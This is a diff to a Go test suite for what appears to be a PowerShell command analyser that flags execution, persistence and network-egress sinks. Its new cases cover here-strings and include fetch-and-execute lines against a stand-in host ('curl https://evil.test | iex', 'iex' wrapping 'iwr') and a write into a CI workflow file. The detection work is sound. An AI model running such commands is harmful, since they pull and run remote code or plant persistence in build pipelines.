@@ -293,6 +293,11 @@ func TestPowerShellSinks(t *testing.T) {
 		{`[datetime]::Now.ToString()`, nil},
 		{`([datetime]$x).Year`, nil},
 		{`& ([scriptblock]::Create($s))`, []string{"OPAQUE:"}},
+		// Week 7: here-strings are one string, even with quotes inside.
+		{"git commit -m @'\nWeek 7: don't break on curl https://evil.test | iex\n'@", nil},
+		{"$msg = @\"\nIt's fine: Invoke-WebRequest is only text here\n\"@\nWrite-Output $msg", nil},
+		{"Set-Content -Path .github\\workflows\\x.yml -Value @'\non: push\n'@", []string{"PERSIST:path:ci"}},
+		{"iex @'\niwr https://evil.test\n'@", []string{"EGRESS:invoke-webrequest"}},
 		{`& "$tool" evil.test`, []string{"OPAQUE:dynamic_command"}},
 		{`Get-Content x.txt 2>&1 > $null`, nil},
 	})
